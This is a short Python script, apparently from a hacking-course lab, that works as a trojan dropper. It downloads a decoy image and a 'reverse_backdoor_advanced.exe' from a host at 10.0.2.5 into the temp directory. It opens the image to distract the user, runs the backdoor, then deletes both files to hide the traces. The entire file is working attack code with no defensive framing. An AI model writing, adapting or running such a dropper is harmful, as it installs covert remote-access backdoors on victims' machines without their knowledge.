

import requests, subprocess, os, tempfile

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://10.0.2.5/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("https://10.0.2.5/evil-files/reverse_backdoor_advanced.exe")
subprocess.call("reverse_backdoor_advanced.exe", shell=True)
os.remove("car.jpg")
os.remove("reverse_backdoor_advanced.exe")
